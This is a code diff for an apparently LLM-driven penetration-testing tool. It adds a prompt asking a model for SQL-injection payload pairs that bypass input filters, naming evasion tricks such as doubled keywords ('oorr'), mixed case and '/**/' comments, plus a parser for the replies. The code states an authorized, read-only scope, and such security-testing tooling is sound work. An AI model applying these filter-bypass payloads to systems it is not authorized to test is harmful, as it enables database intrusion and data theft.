@@ -1,5 +1,6 @@
 import type { Gateway } from "../gateway/bifrostClient.js";
 import { sanitizeToken } from "../gateway/promptSafety.js";
+import type { FilterBrief, PayloadSmith } from "./actions.js";
 
 /** One candidate action the planner may choose next. */
 export interface PlanAction {
@@ -90,5 +91,69 @@ export function makeGatewayPlanner(gateway: Gateway): Planner {
   return async (input) => {
     const raw = await gateway.complete("exploit_reason", buildPrompt(input));
     return parsePlan(raw, input.pending.length);
+  };
+}
+
+/** Prompt for the filter-bypass payload smith. States the authorized, read-only,
+ *  SELECT-side-only boundary, then asks for boolean-oracle pairs that survive the
+ *  observed filter. Target-controlled strings are sanitized before they enter. */
+function buildSmithPrompt(brief: FilterBrief): string {
+  const obs = brief.observations.map((o) => `- ${sanitizeToken(o)}`).join("\n");
+  return [
+    "You assist an AUTHORIZED, read-only penetration test of a web application the",
+    "operator owns and has scoped. A parameter looks injectable, but a server-side",
+    "input filter neutralizes the standard SQL-injection payloads, so the fixed",
+    "probes drew no signal. Reason about the filter from the observations and propose",
+    "BOOLEAN-ORACLE payload pairs that may bypass it.",
+    "",
+    `Field: ${sanitizeToken(brief.field)}`,
+    `Method: ${brief.method}`,
+    "Observations:",
+    obs,
+    "",
+    'Each pair is {"t","f"}: `t` makes the WHERE clause TRUE (row returned), `f`',
+    "makes it FALSE (no row), identical except the boolean. Use ONLY SELECT-side",
+    "boolean logic — NO UNION, NO stacked/second queries, NO writes, NO time-based or",
+    "destructive payloads. Consider: keyword blacklists (double-writing like `oorr` /",
+    "`aanndd`, mixed case, inline comments `/**/`), stripped spaces (`/**/`, `%0b`),",
+    "stripped comments, and numeric vs string context.",
+    "",
+    'Respond with ONLY a JSON array, no prose: [{"t":"0 oorr 1=1","f":"0 oorr 1=2"}]',
+  ].join("\n");
+}
+
+/** Parse the smith's reply into clean {t,f} pairs; tolerant of surrounding prose,
+ *  strict on shape — anything malformed is dropped rather than trusted. */
+export function parsePayloadPairs(raw: string): Array<{ t: string; f: string }> {
+  const start = raw.indexOf("[");
+  const end = raw.lastIndexOf("]");
+  if (start === -1 || end <= start) return [];
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(raw.slice(start, end + 1));
+  } catch {
+    return [];
+  }
+  if (!Array.isArray(parsed)) return [];
+  const pairs: Array<{ t: string; f: string }> = [];
+  for (const row of parsed) {
+    if (row && typeof row === "object") {
+      const t = (row as { t?: unknown }).t;
+      const f = (row as { f?: unknown }).f;
+      if (typeof t === "string" && typeof f === "string" && t.trim() && f.trim()) {
+        pairs.push({ t: t.trim(), f: f.trim() });
+      }
+    }
+  }
+  return pairs;
+}
+
+/** The default payload smith: one strong-model call through Bifrost per filtered
+ *  field. The engine confirms every proposal against the app's own true/false
+ *  fingerprint, so the model supplies ideas, never findings. */
+export function makeGatewayPayloadSmith(gateway: Gateway): PayloadSmith {
+  return async (brief) => {
+    const raw = await gateway.complete("exploit_reason", buildSmithPrompt(brief));
+    return parsePayloadPairs(raw);
   };
 }
